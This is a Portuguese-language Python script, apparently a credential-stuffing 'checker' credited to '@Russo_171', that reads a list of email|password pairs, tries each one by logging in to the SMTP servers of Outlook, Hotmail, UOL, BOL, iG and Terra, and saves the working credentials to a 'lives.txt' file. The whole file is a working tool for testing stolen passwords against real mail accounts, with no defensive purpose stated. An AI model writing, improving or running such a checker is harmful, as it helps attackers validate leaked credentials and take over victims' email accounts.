from colorama import Fore
import os
import smtplib

if not os.path.exists('resultados'):
    os.makedirs('resultados')
    
else:
    pass


print(f'''{Fore.GREEN}
      

 ██████  ██████  ██    ██ ███████ ███████  ██████           ██ ███████  ██ 
██    ██ ██   ██ ██    ██ ██      ██      ██    ██         ███      ██ ███ 
██ ██ ██ ██████  ██    ██ ███████ ███████ ██    ██          ██     ██   ██ 
██ ██ ██ ██   ██ ██    ██      ██      ██ ██    ██          ██    ██    ██ 
 █ ████  ██   ██  ██████  ███████ ███████  ██████  ███████  ██    ██    ██ 
                                                                           

''')


print(f'{Fore.YELLOW} Provedores de email suportados:\n outlook, hotmail, uol, bol, ig e terra\n\n')


def trazer(string,start,end):
	str = string.split(start)
	str = str[1].split(end)
	return str[0]
	pass


pergunta = input('DB (Exemplo: lista.txt): ')

arquivo = open(pergunta).readlines()


for x in arquivo:
    logins = x.split("|")
    email = logins[0]
    senha = logins[1]

    if '@outlook.com' in email:

        host = 'smtp.office365.com'
        porta = 587
    
    elif 'hotmail.com' in email:
        host = 'smtp.office365.com'
        porta = 587
    
    elif '@uol.com.br' in email:
        host = 'smtps.uol.com.br'
        porta = 587
    
    elif '@bol.com.br' in email:
        host = 'smtps.bol.com.br'
        porta = 587
    
    elif '@ig.com.br' in email:
        host = 'smtp.ig.com.br'
        porta = 587
    
    elif 'terra.com.br' in email:
        host = 'smtp.terra.com.br'
        porta = 587
        
    else:
        print(f'{Fore.YELLOW}\n[-] Error => {email}|{senha} => Provedor de email não suportado => Checker criado por: @Russo_171\n')
    

    try:
        servidor = smtplib.SMTP(host, porta)
        servidor.starttls()
        servidor.login(email, senha)
        servidor.quit()
        
        
        print(f'{Fore.GREEN}\n[+] Aprovado => {email}|{senha} => Checker criado por: @Russo_171\n')
            
        f = open("resultados/lives.txt", "a")
        
        f.write(f"\n[+] Aprovado => {email}|{senha} => Checker criado por: @Russo_171\n")
        
        f.close()


    except:
        
        print(f'{Fore.RED}\n[-] Reprovado => {email}|{senha} => Checker criado por: @Russo_171\n')

        f = open("resultados/dies.txt", "a")
        f.write(f"\n[-] Reprovado => {email}|{senha} => Checker criado por: @Russo_171\n")
        f.close()
        

